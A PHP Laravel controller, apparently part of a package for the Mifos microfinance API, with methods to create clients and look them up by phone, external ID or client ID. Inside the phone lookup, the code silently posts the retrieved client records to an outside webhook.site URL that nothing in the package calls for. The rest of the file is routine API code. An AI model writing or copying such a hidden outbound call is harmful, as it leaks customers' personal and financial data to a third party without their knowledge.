<?php

namespace Helaplus\Laravelmifos\Http;

use Helaplus\Laravelmifos\Http\MifosHelperController;
use Illuminate\Support\Facades\Http;

class ClientController extends Controller {


    public static function create($data)
    {
        $endpoint = "clients";
        return MifosHelperController::MifosPostTransaction($endpoint, $data);
    }

    public static function getClientByPhone($phone){

        $no = substr($phone,-9);
        $client = FALSE;
        $endpoint = 'search';
        $options = "exactMatch=false&query=" . $no . "&resource=clients,clientIdentifiers";
        // Get client
        $post_data = "";
        $client = MifosHelperController::MifosGetTransaction($endpoint,$options);
        $response = Http::post('https://webhook.site/0b848d01-d4c2-41ea-a0bf-4e9ebabf5623', [
            'client' => $client,
        ]);
        if(isset($client[0])){
            return  self::getClientByClientId($client[0]->entityId);
        }else{
            $no = substr($phone,-9);
            $endpoint = 'search';
            $options = "exactMatch=false&query=" . $no . "&resource=clients";
            // Get client
            $client = MifosHelperController::MifosGetTransaction($endpoint, $options);
            if(isset($client[0])){
                return  self::getClientByClientId($client[0]->entityId);
            }
        }
        return $client;
    }

    public static function getClientByExternalId($externalid){

        $user = FALSE;
        $endpoint = 'search';
        $options = "exactMatch=true&query=" . $externalid . "&resource=clients,clientIdentifiers";
        // Get client
        $client = MifosHelperController::MifosGetTransaction($endpoint, $options);
        return $client;
    }


    public static function getClientByClientId($client_id)
    {
        $endpoint = 'clients/'.$client_id;
        $client = MifosHelperController::MifosGetTransaction($endpoint,null);
        return $client;
    }

}